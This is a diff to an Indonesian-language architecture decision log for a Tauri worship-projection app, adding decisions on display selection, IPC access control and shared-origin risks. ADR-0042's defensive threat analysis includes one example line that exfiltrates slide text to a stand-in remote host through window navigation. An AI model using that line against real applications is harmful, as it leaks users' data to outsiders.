@@ -1237,8 +1237,14 @@ Bahwa entri yatim tidak berbahaya — ia mendeklarasikan berkas yang tidak ada �
 | | |
 | --- | --- |
 | Tanggal | 2026-08-13 |
-| Status | Diterima — dengan satu pertentangan PRD yang menunggu keputusan pengguna |
+| Status | Diterima — pertentangan PRD **ditutup 2026-08-15 oleh keputusan pengguna** |
 | Terkait | SETUP-05 (NFR-33), PRD §6.4 (baris 585), PRD §6.12 (baris 814), NFR-16 |
+
+**Penutupan, 2026-08-15.** Pengguna memilih mengubah kalimat PRD, bukan mengganti alat. Kalimat §6.4 kini berbunyi tipe "generated into TypeScript **by a checked gate that fails if the committed contract does not match the Rust types**". Ini satu-satunya suntingan yang dibuat pada `docs/PRD.md`, dan ia dibuat atas keputusan pengguna ([H4](PROGRESS.md)) — bukan atas kesimpulan ADR ini.
+
+**Mengapa kalimat penggantinya berbentuk begitu.** Ia menyebut **mekanisme yang benar-benar ada** — `npm run bindings:check` di `pretypecheck` ([ADR-0035](decisions.md#adr-0035)) — alih-alih menyebut fase kompilasi yang tidak pernah menjalankan apa pun. Janji yang sesungguhnya ingin dibeli PRD adalah *"kontrak tidak dapat menyimpang"*, dan gate itulah yang membelinya; "at build time" hanyalah tebakan tentang **kapan** hal itu terjadi, dan tebakan itu salah. NFR-33 sendiri (baris 504) tidak pernah menyebut build time, jadi tidak ada yang perlu diubah di sana — persis satu kalimat di seluruh PRD yang memuat klaim itu.
+
+**Yang tersisa dan sudah dinamai:** komentar `.cargo/config.toml` mengutip frasa lama itu verbatim untuk menjelaskan mengapa ia tidak dapat ditepati. Kutipan itu kini menunjuk kalimat yang tidak ada lagi, dan membiarkannya adalah kelas cacat yang SETUP-05 seluruhnya membahasnya — klaim yang lebih lebar atau berbeda daripada kenyataan. Ia dijadwalkan diperbaiki begitu ronde tester FR-102 yang sedang berjalan selesai, sebab menyunting berkas itu di tengah `cargo test` mengubah lingkungan yang sedang diukur.
 
 **Keputusan.** Kontrak tipe Rust→TypeScript dibangkitkan `ts-rs` 12.0.1, dipasang sebagai **dev-dependency** `aeroworship-core`.
 
@@ -1365,3 +1371,85 @@ Diterima, karena keadaan akhir yang diinginkan justru itu — kedua berkas berub
 **Yang tetap terbuka: pelingkupan per-window.** `capabilities/main-window.json` berbunyi `"windows": ["main"]`, tetapi pembatasan itu hanya mengikat perintah `plugin:`. Perintah app-defined tidak punya pelingkupan per-window sama sekali, sehingga jendela output FR-102/FR-105 akan dapat memanggil setiap perintah begitu ia ada. Hari ini tak dapat dieksploitasi — bundel output terbukti nol `__TAURI_INTERNALS__` — tetapi PRD §6.3 menyandarkan isolasi itu pada **aturan impor**, dan aturan impor tidak menghalangi kode yang masuk lewat XSS lirik atau template. Menutupnya menuntut keputusan arsitektur dan menjadi persyaratan yang dibawa FR-102/FR-105.
 
 **Yang membatalkan keputusan ini.** Perintah pertama yang menyentuh berkas pengguna, jaringan, atau kredensial — di situ "terjangkau tanpa jejak" berhenti menjadi catatan dan mulai menjadi permukaan serangan.
+
+### ADR-0040 — "First non-primary display" dibaca dari posisi, bukan dari urutan enumerasi; dan penempatan dilakukan dalam piksel fisik sesudah jendela dibuat
+
+| | |
+| --- | --- |
+| Tanggal | 2026-08-15 |
+| Status | Diterima |
+| Terkait | FR-102, FR-103, FR-108, [ADR-0037](decisions.md#adr-0037) |
+
+**Keputusan pertama.** Display keluaran dipilih sebagai display non-primer yang sudut kiri-atasnya datang lebih dulu dalam urutan baca virtual-screen: `x` terkecil, seri → `y` terkecil, seri → `id` terkecil.
+
+**Mengapa bukan urutan enumerasi.** Urutan `EnumDisplayMonitors` tidak dijanjikan apa pun — doc FR-101 sendiri sudah memperingatkannya — sehingga `monitors[1]` bukan "display kedua" dalam arti apa pun yang dikenali operator. Posisi adalah properti yang operator **benar-benar atur** di Display Settings, jadi di situlah "pertama" seharusnya dibaca. Menyertakan `id` di kunci pengurutan membuat hasilnya fungsi dari **himpunan** monitor, bukan dari daftarnya: urutan daftar tidak dapat mengubah jawaban, dan justru sifat itu yang membuatnya dapat diuji di `core` dengan nilai `Monitor` rakitan tangan.
+
+**Batas yang dinyatakan, bukan disembunyikan.** Dengan tepat dua display — yaitu kriteria terima FR-102 — **setiap** definisi yang masuk akal memberi jawaban sama; hanya ada satu display non-primer. Definisi ini baru menggigit pada tiga display atau lebih, dan di sana "non-primer paling kiri" adalah tebakan yang berpakaian aturan. Jawaban sesungguhnya untuk kasus itu adalah FR-103 (penetapan manual yang persisten), bukan heuristik yang lebih pintar.
+
+**Dua penolakan, keduanya mengembalikan "jangan buat jendela".** Bila tidak ada display bertanda primer, dan bila tidak ada display non-primer. Menolak lebih baik daripada menutupi layar operator sendiri dengan jendela hitam fullscreen: keadaan "output tidak terbuka" dapat dipulihkan lewat FR-103, sedangkan gambar proyektor yang menimpa layar kontrol di tengah ibadah tidak.
+
+**Keputusan kedua, dan ini menghindari jebakan yang tidak terlihat dari dokumentasi.** Penempatan dilakukan **sesudah** jendela dibuat, dalam **piksel fisik**, tidak pernah lewat builder. `WebviewWindowBuilder::position` menerima koordinat **logis**, dan tao meresolusinya dengan mengonversi pasangan itu memakai faktor skala **setiap** monitor lalu mengambil monitor pertama yang rect-nya memuat hasilnya. Di bawah DPI campuran itu dapat cocok ke display yang salah; bila tidak cocok ke mana pun, posisinya diganti diam-diam menjadi `CW_USEDEFAULT` di display primer. Runtime memang punya perbaikan "fullscreen + position → `Borderless(Some(monitor))`", tetapi ia `#[cfg(any(macos, linux))]` dan **tidak berjalan di Windows** — satu-satunya platform sasaran produk ini.
+
+**Urutan panggilannya menanggung beban.** Buat tersembunyi → `set_position(Physical)` → `set_size(Physical)` → `set_fullscreen(true)` → `show()`. `set_fullscreen(true)` menjadi `Fullscreen::Borderless(None)`, yang tao resolusikan lewat `MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST)` — jendela **harus sudah** berada di display sasaran saat itu. Membangun langsung dengan `fullscreen(true)` juga akan memanggil `force_window_active()`, yaitu persis pencurian fokus yang FR-109 larang.
+
+**Control Panel tidak butuh kode sama sekali.** `"center": true` tanpa posisi eksplisit membuat runtime memusatkannya di `primary_monitor()`, yang di Windows adalah `MonitorFromPoint((0,0), MONITOR_DEFAULTTOPRIMARY)`. Separuh FR-102 sudah dipenuhi `tauri.conf.json`. Ini juga mengoreksi premis coordinator: "primary" bukan tebakan murni di Windows — sudut kiri-atas display primer **adalah** titik asal virtual-screen.
+
+**Catatan yang ditambahkan sesudah bukti negatif, 2026-08-15.** Aturan pengurutan di atas menyebut **arah prioritas** — `x` lebih dulu, `y` hanya sebagai pemecah seri — dan arah itu ternyata **tidak dijaga test mana pun** selama satu ronde penuh. Suite 19-test-nya hijau, keenam gate hijau, tetapi mutasi yang menukar kuncinya menjadi `(y, x, id)` lolos dengan nol kegagalan: pada setiap arrangement yang ditulis, dua kandidat selalu berbagi `x` atau berbagi `y`, sehingga kedua urutan menjawab sama. Kasus yang membedakannya — kedua sumbu berselisih — tak pernah ada. Ditutup dengan `a_smaller_x_beats_a_smaller_y_when_the_two_axes_disagree`. Dicatat di sini, bukan hanya di changelog, sebab kalimat aturan di ADR inilah yang separuhnya tak teruji, dan sebab ia contoh bersih dari hal yang berulang di seluruh proyek ini: **implementasi yang benar dan suite yang hijau tidak bersama-sama membuktikan bahwa spesifikasinya teruji.**
+
+**Yang membatalkan keputusan ini.** FR-103, yang menggantikan pemilihan otomatis dengan penetapan manual yang persisten. Sejak saat itu definisi di atas menjadi hanya nilai awal, bukan aturan.
+
+### ADR-0041 — Jendela output dapat memanggil setiap perintah IPC; manifest ACL aplikasi dinyalakan sebagai item tersendiri, sesudah verifikasi runtime FR-102
+
+| | |
+| --- | --- |
+| Tanggal | 2026-08-15 |
+| Status | Diterima |
+| Terkait | FR-102, FR-105, NFR-14, [ADR-0013](decisions.md#adr-0013) · [ADR-0018](decisions.md#adr-0018) · [ADR-0039](decisions.md#adr-0039) |
+
+**Fakta, dan ia berhenti menjadi ramalan pada commit ini.** Sejak FR-102 melahirkan jendela `output`, jendela itu **ada**, tidak dinamai oleh capability mana pun, dan dapat memanggil `list_monitors` — beserta setiap perintah yang ditambahkan sesudahnya — tanpa meninggalkan jejak di `capabilities/*.json` maupun di `gen/schemas/`. Pelingkupan `"windows": ["main"]` nyata, tetapi hanya untuk perintah `plugin:`.
+
+**Paparan hari ini kecil dan jujur disebut kecil:** satu enumerasi display yang hanya membaca. Bundel output terverifikasi nol `__TAURI_INTERNALS__`, jadi ia bahkan tidak mengimpor jalan untuk memanggilnya. Risikonya bukan hari ini; risikonya adalah permukaan itu tumbuh menuju ~28 perintah Appendix D — beberapa menerima path dan menulis berkas — sementara ketiadaan pelingkupan tetap **tidak terlihat**.
+
+**Keputusan.** Nyalakan manifest ACL aplikasi, **sebagai item tersendiri**, dan **sesudah** pengguna memverifikasi FR-102 secara runtime.
+
+**Mengapa dinyalakan, bukan ditunda lagi.** Tebingnya nyata dan gagal-tertutup: begitu manifest ada, setiap perintah yang tidak dinamai sebuah capability ditolak dengan `Command {} not allowed by ACL`. Tebing itu **paling murah hari ini, pada satu perintah**, dan menjadi mahal secara monoton pada tiap item berikutnya — di FR-5xx ia menjadi migrasi 25 perintah yang tidak akan ada yang mau menjadwalkannya. Ia juga memperbaiki metode verifikasi NFR-14, yang hari ini melaporkan permukaan **lebih kecil** daripada yang ada.
+
+**Mengapa item tersendiri, bukan di dalam FR-102.** Ia menyentuh `build.rs`, kedua berkas capability, dan guard inventaris; dan regresi `Command not allowed by ACL` **tidak terlihat sampai frontend benar-benar memanggil sesuatu**. Menggabungkannya berarti verifikasi runtime pengguna tidak dapat membedakan cacat penempatan dari cacat perizinan — satu-satunya kesempatan menguji dua hal yang belum pernah diuji akan terbuang untuk membingungkan keduanya.
+
+**Bantahan yang diterima di muka.** Ia tidak membeli apa pun hari ini, dan ia menambah mekanisme build-script yang dapat mematikan seluruh permukaan IPC dalam satu commit yang salah — tanpa jalan keluar runtime, sebab `dynamic-acl` sengaja mati ([ADR-0013](decisions.md#adr-0013)). Bila keberatan itu menang, jalan mundur yang jujur adalah yang murah: setiap perintah menerima `webview: tauri::Webview<R>` dan menolak `webview.label() == "output"` lewat satu helper bersama, dengan aturannya ditulis di `commands/mod.rs` bersebelahan dengan aturan argumen. Itu penegakan lewat konvensi dan tinjauan kode, bukan lewat framework — lebih lemah, tetapi ia meninggalkan jejak di diff, dan itu sudah lebih daripada yang ada sekarang.
+
+**Pemicunya dikoreksi, 2026-08-15, atas bantahan auditor FR-102 yang saya terima.** Kalimat asli menjadwalkan item ACL "**sesudah** verifikasi runtime FR-102". Itu salah, dan salahnya bukan soal urutan melainkan soal jenis: verifikasi runtime menjawab "apakah jendelanya mendarat di proyektor", yang **tidak berhubungan sama sekali** dengan risiko yang keputusan ini kelola. Menjadwalkan pengerasan keamanan pada tonggak yang tidak berkorelasi berarti tanggalnya dapat lewat tanpa siapa pun menyadari bahwa alasannya tidak pernah terpenuhi.
+
+**Pemicu yang benar dinyatakan sebagai batas akhir, bukan sebagai urutan.** Item ACL wajib selesai **sebelum** yang mana pun dari dua hal ini mendarat: (a) item pertama yang merender konten berasal-berkas di jendela output — renderer lirik FR-4xx atau `.aerotpl` §6.7, mana pun lebih dulu; (b) perintah pertama yang menerima path atau menulis berkas — kelompok FR-5xx. Sebelum salah satunya, ADR ini bersama [ADR-0042](decisions.md#adr-0042) adalah kumpulan cacat laten; sesudahnya ia menjadi satu rantai. Verifikasi runtime FR-102 tetap boleh mendahului, dan alasan pemisahan di bawah tetap berlaku — ia hanya berhenti menjadi *pemicu*.
+
+**Yang membatalkan keputusan ini.** Perintah kedua yang mendarat sebelum item ACL dikerjakan — sejak saat itu argumen "paling murah hari ini" berhenti berlaku dan biayanya harus dihitung ulang.
+
+### ADR-0042 — Kedua jendela berbagi satu web origin; empat permukaan yang lahir bersama jendela output ditunda di bawah satu pemicu yang dapat diperiksa
+
+| | |
+| --- | --- |
+| Tanggal | 2026-08-15 |
+| Status | Diterima |
+| Terkait | FR-102, FR-104, FR-105, FR-109, PRD §6.3, NFR-13, NFR-14, [ADR-0018](decisions.md#adr-0018) · [ADR-0039](decisions.md#adr-0039) · [ADR-0041](decisions.md#adr-0041) |
+
+**Fakta yang belum pernah tercatat di mana pun, dan ia membatalkan sebuah asumsi diam.** `WebviewUrl::App` menyelesaikan ke base URL aplikasi — di Windows `http://tauri.localhost` (`tauri-2.11.5/src/manager/mod.rs:338-342`), di dev `http://localhost:1420`. Jadi `index.html` dan `output.html` adalah **origin yang sama**. Grep `same-origin|localStorage|BroadcastChannel|tauri.localhost` di seluruh `*.md` repo ini memberi **nol hasil**: tidak ada satu berkas pun yang pernah menyangkal bahwa dua bundel berarti dua sandbox.
+
+**PRD §6.3 memisahkan kode, bukan origin.** Aturan impor di `eslint.config.js:276-320` nyata dan ditegakkan — bahkan secara transitif lewat `src/shared/**` dan atas `import()` dinamis — tetapi ia batas **build-time**. Ia tidak memisahkan `localStorage`, `sessionStorage`, IndexedDB, Cache API, `BroadcastChannel`, maupun `SharedWorker`. Script yang kelak lolos ke dokumen output berada pada origin yang sama dengan Control Panel, membaca dan menulis seluruh penyimpanannya, dan `new BroadcastChannel(...)` memberinya kanal dua arah ke jendela operator **tanpa melewati IPC sama sekali** — sehingga tidak ada capability, ACL, maupun CSP yang menghalanginya. Semuanya sah menurut same-origin policy.
+
+**Aturan yang berlaku mulai sekarang, dan ia murah selama masih murah.** Control Panel **tidak menyimpan apa pun di web storage**. Keadaan yang perlu bertahan hidup melewati restart adalah milik SQLite lewat IPC ([ADR-0008](decisions.md#adr-0008)), yang memang sudah menjadi rencananya; menuliskannya di sini mengubah kebetulan menjadi kewajiban, sebelum ada `localStorage.setItem` pertama yang membuatnya mahal untuk dicabut.
+
+**Tiga permukaan lain yang lahir bersama jendela ini, ditunda tetapi dinamai.**
+
+1. **Tidak ada navigation handler pada jendela mana pun.** `pending.navigation_handler` bernilai `None`, dan `tauri-runtime-wry-2.11.4/src/lib.rs:4899-4906` hanya memasang `with_navigation_handler` bila handler itu ada — tanpa itu wry mengizinkan navigasi ke URL apa pun. CSP tidak menolong: tidak ada direktif yang mengatur navigasi top-level (`navigate-to` tidak diimplementasikan Chromium; `form-action 'none'` hanya menutup submit form). Konsekuensinya menyentuh **NFR-13**: `location = 'https://x/?' + document.body.innerText` mengirim isi slide keluar dan memindahkan layar proyektor ke halaman remote, dari aplikasi yang tidak punya satu baris kode jaringan pun.
+2. **Context menu WebView2 dan accelerator browser aktif** di jendela proyektor — `wry-0.55.1/src/lib.rs:1687-1688` memberi keduanya `true` secara default dan `tauri-runtime-wry` tidak pernah memanggil `with_default_context_menus`. Klik kanan memunculkan menu Edge di layar jemaat; Ctrl+S/Ctrl+P membuka dialog simpan/cetak native — jalur tulis filesystem di jendela yang sengaja tidak diberi satu pun permission filesystem. **FR-105** pemiliknya.
+3. **Proyektor dicabut → jendela fullscreen berpindah ke layar operator**, tanpa dekorasi, tanpa tombol taskbar, dan tanpa entri Alt-Tab (`skip_taskbar(true)` memasang `WS_EX_TOOLWINDOW`). **FR-104** pemiliknya.
+
+**Urutan yang wajib dipatuhi, dan ia jenis persyaratan yang biasanya hilang.** Hari ini keadaan (3) masih **dapat dipulihkan** semata-mata karena `always_on_top` sengaja tidak diset, sehingga Alt-Tab ke Control Panel menaikkannya di atas permukaan hitam. **FR-109 tidak boleh menambahkan topmost sebelum FR-104 selesai** — melakukannya mengubah "mengganggu" menjadi "tidak dapat dipulihkan tanpa Task Manager", di tengah ibadah, pada satu-satunya layar yang tersisa.
+
+**Mengapa keempatnya ditunda, dan mengapa penundaan itu bukan kelalaian.** Tak satu pun dapat dieksploitasi hari ini: `Renderer.vue` merender satu konstanta string, nol konten tak tepercaya masuk ke jendela mana pun, dan bundel output tidak mengimpor `@tauri-apps/api`, router, store, maupun `fetch`. Yang dibeli penundaan bukan waktu melainkan **pemisahan sinyal**: memperbaiki empat hal ini di dalam FR-102 berarti verifikasi runtime pengguna tidak dapat membedakan cacat penempatan dari cacat pengerasan.
+
+**Pemicunya sama dengan [ADR-0041](decisions.md#adr-0041), dan itu disengaja.** Keempatnya wajib tertutup **sebelum** yang mana pun lebih dulu dari: item pertama yang merender konten berasal-berkas di jendela output (FR-4xx, atau `.aerotpl` §6.7), atau perintah pertama yang menerima path atau menulis berkas (FR-5xx). Satu pemicu untuk lima temuan sebab kelimanya menjadi berbahaya oleh **sebab yang sama** — masuknya konten yang tidak kita tulis — dan memisahkan pemicunya hanya akan membuat sebagian terlewat.
+
+**Bantahan yang diterima di muka.** Empat cacat laten yang ditunda bersama-sama adalah bentuk yang persis diketahui gagal: masing-masing tampak kecil, dan yang menutupnya kelak menghadapi empat sekaligus di bawah tekanan tenggat item lain. Bila keberatan itu menang, yang paling murah dikerjakan lebih dulu adalah navigation handler — tiga baris, menutup satu-satunya di antara keempatnya yang berakibat **keluar dari mesin**.
+
+**Yang membatalkan keputusan ini.** `localStorage.setItem` pertama di kode Control Panel, atau item pertama yang merender konten berasal-berkas — mana pun lebih dulu.
